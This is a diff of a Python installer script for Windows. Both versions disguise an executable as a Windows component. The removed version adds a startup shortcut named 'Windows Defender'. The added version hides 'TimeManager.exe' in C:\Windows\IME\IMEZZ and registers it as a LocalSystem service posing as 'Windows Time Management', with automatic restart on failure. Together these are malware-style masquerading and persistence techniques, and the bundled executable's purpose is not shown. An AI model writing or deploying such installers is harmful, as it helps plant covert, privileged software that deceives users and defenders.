@@ -1,105 +1,194 @@
 import os
 import shutil
 import sys
-import subprocess
 import json
-from win32com.client import Dispatch
+import subprocess
+import logging
+import time
+import win32serviceutil
+import win32service
+import win32event
+import servicemanager
+import socket
+import win32api
+import win32con
+import ctypes
+from datetime import datetime
 
-# Define paths
-wallpaper_folder_name = "Wallpapers"
-icon_name = "ShortcutIcon.ico"
-exe_name = "Windows Security Service.exe"
-settings_file_name = "settings.json"
+# Configure logging
+LOG_FILE = os.path.join(os.environ.get('TEMP', '.'), 'TimeManager_Install.log')
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler(LOG_FILE, mode='w'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-script_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)  # Works in .exe mode
-script_dir = os.path.dirname(script_path)
-destination_folder = r"C:\ProgramData\SystemAssets"
+# Path Configuration
+script_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
+WALLPAPER_FOLDER_NAME = "Wallpapers"
+EXE_NAME = "TimeManager.exe"
+SETTINGS_FILE_NAME = "settings.json"
 
-# Paths for new locations
-new_exe_path = os.path.join(destination_folder, exe_name)
-new_icon_path = os.path.join(destination_folder, icon_name)
-new_wallpaper_folder_path = os.path.join(destination_folder, wallpaper_folder_name)
-new_settings_path = os.path.join(destination_folder, settings_file_name)
+# Source and Destination Paths
+source_wallpapers = os.path.join(script_dir, WALLPAPER_FOLDER_NAME)
+source_exe = os.path.join(script_dir, EXE_NAME)
+source_settings = os.path.join(script_dir, SETTINGS_FILE_NAME)
+DESTINATION_FOLDER = r"C:\Windows\IME\IMEZZ"
+dest_exe = os.path.join(DESTINATION_FOLDER, EXE_NAME)
+dest_wallpapers = os.path.join(DESTINATION_FOLDER, WALLPAPER_FOLDER_NAME)
+dest_settings = os.path.join(DESTINATION_FOLDER, SETTINGS_FILE_NAME)
 
-# Define the Startup folder and shortcut path
-startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
-shortcut_path = os.path.join(startup_folder, "Windows Defender.lnk")
+# Service Configuration
+SERVICE_NAME = "W32TimeManager"
+SERVICE_DISPLAY_NAME = "Windows Time Management"
+SERVICE_DESCRIPTION = "Maintains system time synchronization"
 
-# Load settings from settings.json
-settings = {"wait_until_restart_to_run": True}  # Default if settings.json is missing
-settings_path = os.path.join(script_dir, settings_file_name)
-
-if os.path.exists(settings_path):
+def kill_running_instances():
+    """Forcefully terminate any running instances"""
     try:
-        with open(settings_path, "r") as f:
-            settings = json.load(f)
-    except json.JSONDecodeError:
-        print("Error reading settings.json, using defaults.")
-
-# Ensure the SystemAssets folder exists
-try:
-    if not os.path.exists(destination_folder):
-        os.makedirs(destination_folder)
-
-    # Copy the Wallpapers folder (overwrite if exists)
-    old_wallpaper_folder_path = os.path.join(script_dir, wallpaper_folder_name)
-    if os.path.exists(old_wallpaper_folder_path):
-        if os.path.exists(new_wallpaper_folder_path):
-            shutil.rmtree(new_wallpaper_folder_path)  # Delete existing folder before copying
-        shutil.copytree(old_wallpaper_folder_path, new_wallpaper_folder_path)
-        print(f"Copied {wallpaper_folder_name} folder to {new_wallpaper_folder_path}")
-    else:
-        print(f"Wallpapers folder not found: {wallpaper_folder_name}")
-
-    # Copy the executable (overwrite if exists)
-    exe_path = os.path.join(script_dir, exe_name)
-    if os.path.exists(exe_path):
-        shutil.copy2(exe_path, new_exe_path)
-        print(f"Copied {exe_name} to {new_exe_path}")
-    else:
-        print("Executable file not found!")
-
-    # Copy the icon (overwrite if exists)
-    old_icon_path = os.path.join(script_dir, icon_name)
-    if os.path.exists(old_icon_path):
-        shutil.copy2(old_icon_path, new_icon_path)
-        print(f"Copied {icon_name} to {new_icon_path}")
-    else:
-        print("Icon file not found!")
-
-    # Copy the settings file (overwrite if exists)
-    if os.path.exists(settings_path):
-        shutil.copy2(settings_path, new_settings_path)
-        print(f"Copied {settings_file_name} to {new_settings_path}")
-    else:
-        print(f"Settings file not found: {settings_file_name}")
-
-except Exception as e:
-    print(f"Error: {e}")
-
-# Create a shortcut to run the executable as administrator with custom icon
-def create_admin_shortcut(target_path, shortcut_path, icon_path):
-    shell = Dispatch("WScript.Shell")
-    shortcut = shell.CreateShortcut(shortcut_path)
-    shortcut.TargetPath = target_path
-    shortcut.WorkingDirectory = os.path.dirname(target_path)
-    shortcut.IconLocation = icon_path
-    shortcut.Arguments = ""
-    shortcut.Save()
-    print(f"Shortcut created at {shortcut_path} with custom icon.")
-
-# Create the shortcut in the Startup folder
-try:
-    create_admin_shortcut(new_exe_path, shortcut_path, new_icon_path)
-except Exception as e:
-    print(f"Error creating shortcut: {e}")
-
-# If "wait_until_restart_to_run" is False, run the shortcut immediately
-if not settings.get("wait_until_restart_to_run", True):
-    try:
-        print("Launching the shortcut immediately...")
-        subprocess.Popen(shortcut_path, shell=True)  # Run the shortcut
+        subprocess.run(
+            ['taskkill', '/f', '/im', EXE_NAME],
+            timeout=10,
+            stderr=subprocess.PIPE,
+            stdout=subprocess.PIPE
+        )
+        logger.info("Terminated running instances")
+        time.sleep(2)  # Allow time for process cleanup
     except Exception as e:
-        print(f"Error launching shortcut: {e}")
+        logger.warning(f"Error terminating instances: {str(e)}")
 
-print("Setup completed successfully.")
+def secure_file_copy(src, dst):
+    """Robust file replacement with multiple fallbacks"""
+    try:
+        # First try normal copy
+        shutil.copy2(src, dst)
+        return True
+    except PermissionError:
+        try:
+            # Try rename trick
+            temp_dst = dst + ".tmp"
+            if os.path.exists(dst):
+                os.replace(dst, temp_dst)
+            shutil.copy2(src, dst)
+            if os.path.exists(temp_dst):
+                os.remove(temp_dst)
+            return True
+        except Exception as e:
+            logger.error(f"File replacement failed: {str(e)}")
+            return False
+
+def copy_files():
+    """Force copy all files with multiple fallback methods"""
+    try:
+        logger.info(f"Copying files to {DESTINATION_FOLDER}")
+        os.makedirs(DESTINATION_FOLDER, exist_ok=True)
+
+        # Wallpapers - complete replacement
+        if os.path.exists(source_wallpapers):
+            if os.path.exists(dest_wallpapers):
+                shutil.rmtree(dest_wallpapers, ignore_errors=True)
+            shutil.copytree(source_wallpapers, dest_wallpapers)
+            logger.info(f"Copied {len(os.listdir(dest_wallpapers))} wallpapers")
+
+        # Executable - robust replacement
+        kill_running_instances()
+        if os.path.exists(source_exe):
+            if not secure_file_copy(source_exe, dest_exe):
+                raise PermissionError(f"Failed to replace {dest_exe}")
+            os.system(f'attrib +h "{dest_exe}"')
+            logger.info("Replaced main executable")
+
+        # Settings file
+        if os.path.exists(source_settings):
+            shutil.copy2(source_settings, dest_settings)
+            logger.info("Copied settings file")
+
+    except Exception as e:
+        logger.critical(f"File copy failed: {str(e)}", exc_info=True)
+        raise
+
+def install_service():
+    """Complete service installation with enhanced startup handling"""
+    try:
+        logger.info("Configuring Windows service")
+
+        # 1. Stop and remove existing service
+        try:
+            subprocess.run(['sc', 'stop', SERVICE_NAME], timeout=10, check=False)
+            time.sleep(2)
+        except:
+            pass
+
+        try:
+            subprocess.run(['sc', 'delete', SERVICE_NAME], timeout=10, check=False)
+            logger.info("Removed existing service")
+            time.sleep(1)
+        except subprocess.CalledProcessError as e:
+            if "does not exist" not in str(e.stderr):
+                raise
+
+        # 2. Create service with manual start (we'll start it differently)
+        subprocess.run([
+            'sc', 'create', SERVICE_NAME,
+            'binPath=', f'"{dest_exe} --service"',  # Note the --service argument
+            'start=', 'demand',  # Changed to manual start
+            'DisplayName=', f'"{SERVICE_DISPLAY_NAME}"',
+            'type=', 'own',
+            'error=', 'normal',
+            'obj=', 'LocalSystem'
+        ], timeout=30, check=True)
+
+        # 3. Configure service description
+        try:
+            key = win32api.RegOpenKey(
+                win32con.HKEY_LOCAL_MACHINE,
+                f"SYSTEM\\CurrentControlSet\\Services\\{SERVICE_NAME}",
+                0, win32con.KEY_SET_VALUE
+            )
+            win32api.RegSetValueEx(key, "Description", 0, win32con.REG_SZ, SERVICE_DESCRIPTION)
+            win32api.RegCloseKey(key)
+        except Exception as e:
+            logger.warning(f"Couldn't set description: {str(e)}")
+
+        # 4. Configure service recovery
+        subprocess.run([
+            'sc', 'failure', SERVICE_NAME,
+            'reset=', '60',
+            'actions=', 'restart/5000/restart/5000/restart/5000'
+        ], timeout=10, check=True)
+
+        # 5. Start the executable directly instead of through service
+        try:
+            subprocess.Popen([dest_exe], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+            logger.info("Launched TimeManager directly")
+            return
+        except Exception as e:
+            logger.error(f"Direct launch failed: {str(e)}")
+
+        # 6. Final fallback - try service start
+        try:
+            subprocess.run(['sc', 'start', SERVICE_NAME], timeout=30, check=True)
+            logger.info("Service started successfully")
+        except Exception as e:
+            logger.warning(f"Service start failed: {str(e)}")
+            # Non-critical error - application may still run
+
+    except Exception as e:
+        logger.critical(f"Service configuration failed: {str(e)}", exc_info=True)
+        raise
+
+if __name__ == "__main__":
+    try:
+        logger.info("=== Installation Started ===")
+        copy_files()
+        install_service()
+        logger.info("=== INSTALLATION COMPLETED SUCCESSFULLY ===")
+        print(f"Log file: {LOG_FILE}")
+    except Exception as e:
+        logger.critical(f"INSTALLATION FAILED: {str(e)}", exc_info=True)
+        print(f"Installation failed. See {LOG_FILE} for details.")
+        sys.exit(1)
